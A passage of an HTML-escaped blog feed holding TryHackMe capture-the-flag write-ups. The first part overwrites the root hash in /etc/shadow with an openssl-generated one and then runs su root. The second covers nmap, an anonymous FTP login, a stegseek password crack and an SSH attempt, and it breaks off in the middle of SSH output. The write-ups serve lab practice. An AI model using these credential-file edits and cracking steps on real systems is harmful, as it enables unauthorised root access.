&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>/usr/bin/nano /etc/shadow&lt;/p>
&lt;p>I wasn’t able to crack the password, but maybe can just change it.&lt;/p>
&lt;p>I generated the password using&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">openssl passwd -6 -salt xyz cat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And then I replaced the root one:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">root:&lt;span class="nv">$6$xyz$SY6bQy3sDajZ0bHnCG35i3R6ykQksyM6FsKDhwWIi6PAr1tmNG2IIkuMaKq&lt;/span>.eZtztGCTScNGLxe9Fdzn4CBMK1:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">daemon:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sys:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">games:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lp:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mail:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">news:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uucp:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxy:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">backup:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">list:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">irc:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gnats:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nobody:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-network:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-resolve:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-timesync:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">messagebus:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_apt:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tss:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uuidd:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tcpdump:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sshd:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">landscape:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pollinate:*:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ec2-instance-connect:!:18561:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systemd-coredump:!!:19502::::::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ubuntu:&amp;lt;redacted&amp;gt;:19519:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lxd:!:19502::::::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql:!:19502:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish:&amp;lt;redacted&amp;gt;.:19516:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp:*:19519:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bind:*:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Debian-snmp:!:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">redis:*:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mosquitto:*:19523:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fwupd-refresh:*:19544:0:99999:7:::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now I can su as the root and get the flag in the root directory.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">su root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: cat
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@ip-10-10-108-101:/home/zeamkish#
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Brooklyn99 Writeup THM</title><link>https://simonefelici.github.io/p/brooklyn99-writeup-thm/</link><pubDate>Sat, 27 Jan 2024 17:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/brooklyn99-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled.png" alt="Featured image of post Brooklyn99 Writeup THM" />&lt;p>First of all I am going to start with a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sC -sV -p- 10.10.127.58
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-27 13:15 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.127.58
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.064s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65532&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp vsftpd 3.0.3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-anon: Anonymous FTP login allowed &lt;span class="o">(&lt;/span>FTP code 230&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_-rw-r--r-- &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">119&lt;/span> May &lt;span class="m">17&lt;/span> &lt;span class="m">2020&lt;/span> note_to_jake.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> STAT:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> FTP server status:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connected to ::ffff:10.11.65.91
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Logged in as ftp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> TYPE: ASCII
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> No session bandwidth limit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Session timeout in seconds is &lt;span class="m">300&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Control connection is plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Data connections will be plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> At session startup, client count was &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> vsFTPd 3.0.3 - secure, fast, stable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_End of status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.29 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Site doesn&lt;span class="err">&amp;#39;&lt;/span>t have a title &lt;span class="o">(&lt;/span>text/html&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OSs: Unix, Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 30.07 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that it’s running a ftp server(with anonymous login allowed) and a website on port 80,&lt;/p>
&lt;p>firstly I am going to check for the ftp server:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ftp 10.10.127.58
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connected to 10.10.127.58.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">220&lt;/span> &lt;span class="o">(&lt;/span>vsFTPd 3.0.3&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name &lt;span class="o">(&lt;/span>10.10.127.58:kali&lt;span class="o">)&lt;/span>: anonymous
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">331&lt;/span> Please specify the password.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">230&lt;/span> Login successful.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Remote system &lt;span class="nb">type&lt;/span> is UNIX.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using binary mode to transfer files.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">229&lt;/span> Entering Extended Passive Mode &lt;span class="o">(||&lt;/span>&lt;span class="p">|&lt;/span>33749&lt;span class="p">|&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Here comes the directory listing.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">119&lt;/span> May &lt;span class="m">17&lt;/span> &lt;span class="m">2020&lt;/span> note_to_jake.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Directory send OK.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; get note_to_jake.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">local: note_to_jake.txt remote: note_to_jake.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">229&lt;/span> Entering Extended Passive Mode &lt;span class="o">(||&lt;/span>&lt;span class="p">|&lt;/span>62565&lt;span class="p">|&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Opening BINARY mode data connection &lt;span class="k">for&lt;/span> note_to_jake.txt &lt;span class="o">(&lt;/span>&lt;span class="m">119&lt;/span> bytes&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">100% &lt;span class="p">|&lt;/span>********************************************************************************************************************************************************************************************&lt;span class="p">|&lt;/span> &lt;span class="m">119&lt;/span> 39.55 KiB/s 00:00 ETA
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Transfer complete.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">119&lt;/span> bytes received in 00:00 &lt;span class="o">(&lt;/span>2.00 KiB/s&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; &lt;span class="nb">exit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">221&lt;/span> Goodbye.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali🔥kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Desktop Documents Downloads go hhupd.exe Music note_to_jake.txt pass.txt Pictures Public TCM Templates tools Videos
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali🔥kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ cat note_to_jake.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">From Amy,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jake please change your password. It is too weak and holt will be mad &lt;span class="k">if&lt;/span> someone hacks into the nine nine
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that there is a note for Jake, maybe this could mean that we should try some brute forcing on Jake’s password.&lt;/p>
&lt;p>Now we also have 3 possible usernames: Amy, Jake, holt.&lt;/p>
&lt;p>But now I am going to check the site:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>In the source page there is this message, so i think that I should download the images and check if there is some secrete message:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> Found passphrase: &lt;span class="s2">&amp;#34;&amp;lt;redacted&amp;gt;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> Original filename: &lt;span class="s2">&amp;#34;note.txt&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>i&lt;span class="o">]&lt;/span> Extracting to &lt;span class="s2">&amp;#34;brooklyn99.jpg.out&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Apparently there was a note in it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat brooklyn99.jpg.out
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Holts Password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enjoy!!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And I got Holts Password.&lt;/p>
&lt;p>But we can’t ssh in it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh holts@10.10.127.58
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The authenticity of host &lt;span class="s1">&amp;#39;10.10.127.58 (10.10.127.58)&amp;#39;&lt;/span> can&lt;span class="s1">&amp;#39;t be established.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">This key is not known by any other names.
